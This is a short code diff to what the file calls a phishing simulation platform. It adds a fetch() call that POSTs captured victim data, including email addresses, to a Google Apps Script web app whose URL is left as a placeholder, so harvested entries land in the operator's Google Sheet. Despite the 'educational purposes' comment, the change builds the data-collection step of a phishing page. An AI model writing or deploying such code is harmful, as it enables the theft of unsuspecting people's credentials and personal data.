@@ -1,3 +1,4 @@
+
 // Phishing Simulation Platform - Developer Only Access
 // This is for controlled educational purposes only
 
@@ -157,6 +158,19 @@ class PhishingSimulation {
         this.createExcelReport();
         this.updateDeveloperStats();
         
+        // إرسال البيانات إلى Google Sheet عبر Apps Script Web App
+        fetch('ضع_رابط_الويب_آب_من_Google_هنا', {
+            method: 'POST',
+            body: JSON.stringify(captureData),
+            headers: {
+                'Content-Type': 'application/json'
+            }
+        }).then(res => {
+            console.log('تم إرسال البيانات إلى Google Sheet بنجاح');
+        }).catch(err => {
+            console.error('خطأ في إرسال البيانات إلى Google Sheet:', err);
+        });
+
         console.log('📊 Data captured:', { email, timestamp: captureData.timestamp });
     }
 
